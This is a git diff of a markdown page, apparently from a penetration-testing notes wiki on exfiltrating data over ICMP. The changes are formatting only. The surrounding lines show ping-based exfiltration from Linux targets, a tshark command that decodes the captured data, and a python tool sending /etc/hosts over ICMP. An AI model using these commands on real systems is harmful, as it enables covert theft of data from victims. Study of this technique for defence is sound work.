@@ -22,7 +22,7 @@ Notably, **RFC 792** (which defines ICMP) does not impose any strict requirement
 
 {% tabs %}
 {% tab title="Manualy" %}
-### Linux Target
+#### Linux Target
 
 We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` command.
 
@@ -47,7 +47,7 @@ v4resk@kali$  tshark -r pass.pcap -Y "icmp" -T fields -e data | xxd -r -p
 Note that the -p option is only available for **Linux operating systems**. We can confirm that by checking the ping's help manual page.
 {% endhint %}
 
-To facilitate file exfiltration and remove the limit of 16 bytes in the data field using the native ping command, you can alternatively employ [ICMP-Data-Exfiltration](https://github.com/Gurpreet06/ICMP-Data-Exfiltration) (python).&#x20;
+To facilitate file exfiltration and remove the limit of 16 bytes in the data field using the native ping command, you can alternatively employ [ICMP-Data-Exfiltration](https://github.com/Gurpreet06/ICMP-Data-Exfiltration) (python).
 
 ```bash
 # On target
@@ -57,7 +57,7 @@ python3 icmp_exfiltration.py -i 127.0.0.1 -m send -f /etc/hosts
 python3 icmp_exfiltration.py -i wlan0 -m recv -f mydata
 ```
 
-### Windows Target
+#### Windows Target
 
 On a Windows victime, we may exfiltrate data over ICMP using poweshell
 
